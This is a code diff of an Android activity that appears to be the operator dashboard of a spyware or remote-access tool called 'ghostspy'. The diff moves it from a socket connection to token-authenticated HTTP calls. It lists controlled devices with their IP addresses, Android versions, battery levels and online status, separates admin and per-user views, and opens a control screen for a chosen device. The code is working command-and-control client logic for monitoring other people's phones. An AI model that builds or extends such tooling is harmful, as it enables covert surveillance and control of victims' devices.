@@ -2,21 +2,24 @@ package com.testapp;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.widget.LinearLayout;
 import android.widget.TextView;
-import io.socket.client.IO;
-import io.socket.client.Socket;
 import org.json.JSONArray;
 import org.json.JSONObject;
-import java.net.URISyntaxException;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends Activity {
-    private Socket socket;
     private TextView statusText;
     private LinearLayout deviceContainer;
+    private String token, email, role;
+    private static final String SERVER = "https://ghostspy.bruang.biz.id";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -25,25 +28,36 @@ public class MainActivity extends Activity {
 
         statusText = findViewById(R.id.statusText);
         deviceContainer = findViewById(R.id.deviceContainer);
-        statusText.setText("⏳ Menghubungkan...");
 
-        try {
-            socket = IO.socket("https://ghostspy.bruang.biz.id");
-        } catch (URISyntaxException e) {
-            statusText.setText("❌ URL Error");
+        SharedPreferences prefs = getSharedPreferences("ghostspy", MODE_PRIVATE);
+        token = prefs.getString("token", "");
+        email = prefs.getString("email", "");
+        role = prefs.getString("role", "");
+
+        if (token.isEmpty()) {
+            statusText.setText("❌ Tidak terautentikasi");
             return;
         }
 
-        socket.on(Socket.EVENT_CONNECT, args -> {
-            runOnUiThread(() -> {
-                statusText.setText("🟢 ONLINE");
-                socket.emit("get_devices");
-            });
-        });
+        statusText.setText("⏳ Memuat perangkat...");
+        fetchDevices();
+    }
 
-        socket.on("devices_list", args -> {
+    private void fetchDevices() {
+        new Thread(() -> {
             try {
-                JSONArray devices = (JSONArray) args[0];
+                String urlStr = SERVER + "/api/devices";
+                if (!role.equals("admin")) {
+                    urlStr = SERVER + "/api/my-devices";
+                }
+                URL url = new URL(urlStr);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestProperty("Authorization", "Bearer " + token);
+                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = br.readLine()) != null) sb.append(line);
+                JSONArray devices = new JSONArray(sb.toString());
                 List<String[]> list = new ArrayList<>();
                 for (int i = 0; i < devices.length(); i++) {
                     JSONObject d = devices.getJSONObject(i);
@@ -61,11 +75,10 @@ public class MainActivity extends Activity {
                 runOnUiThread(() -> {
                     deviceContainer.removeAllViews();
                     if (list.isEmpty()) {
-                        statusText.setText("🟢 ONLINE | 0 perangkat");
+                        statusText.setText("📭 Tidak ada perangkat");
                         return;
                     }
                     for (String[] data : list) {
-                        // Card premium
                         LinearLayout card = new LinearLayout(MainActivity.this);
                         card.setOrientation(LinearLayout.VERTICAL);
                         card.setBackground(getDrawable(R.drawable.card_admin));
@@ -76,7 +89,6 @@ public class MainActivity extends Activity {
                         lp.setMargins(0, 0, 0, 12);
                         card.setLayoutParams(lp);
 
-                        // Baris atas: nama & status
                         LinearLayout topRow = new LinearLayout(MainActivity.this);
                         topRow.setOrientation(LinearLayout.HORIZONTAL);
                         topRow.setGravity(android.view.Gravity.CENTER_VERTICAL);
@@ -90,8 +102,7 @@ public class MainActivity extends Activity {
                                 0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
                         modelView.setLayoutParams(modelParams);
 
-                        String lastSeen = data[4];
-                        boolean online = lastSeen.contains("now") || lastSeen.contains("Just");
+                        boolean online = data[4].contains("now") || data[4].contains("Just");
                         TextView statusBadge = new TextView(MainActivity.this);
                         statusBadge.setText(online ? "ONLINE" : "OFFLINE");
                         statusBadge.setTextColor(online ? 0xFF00E676 : 0xFF9AA3B2);
@@ -103,14 +114,12 @@ public class MainActivity extends Activity {
                         topRow.addView(statusBadge);
                         card.addView(topRow);
 
-                        // Info tambahan
                         TextView infoView = new TextView(MainActivity.this);
                         infoView.setText("ID: " + data[0] + " | Android " + data[2] + "\nIP: " + data[3] + " | Bat: " + data[5] + "% | " + data[7]);
                         infoView.setTextColor(0xFF9AA3B2);
                         infoView.setTextSize(12);
                         card.addView(infoView);
 
-                        // Klik perangkat -> Detail (belum ada, kita arahkan ke ControlActivity dulu)
                         card.setOnClickListener(v -> {
                             Intent i = new Intent(MainActivity.this, ControlActivity.class);
                             i.putExtra("deviceId", data[0]);
@@ -122,23 +131,11 @@ public class MainActivity extends Activity {
 
                         deviceContainer.addView(card);
                     }
-                    statusText.setText("🟢 ONLINE | " + list.size() + " perangkat");
+                    statusText.setText("🟢 " + list.size() + " perangkat");
                 });
             } catch (Exception e) {
-                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
+                runOnUiThread(() -> statusText.setText("⚠️ Gagal memuat data"));
             }
-        });
-
-        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
-            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
-        });
-
-        socket.connect();
-    }
-
-    @Override
-    protected void onDestroy() {
-        if (socket != null) socket.disconnect();
-        super.onDestroy();
+        }).start();
     }
 }
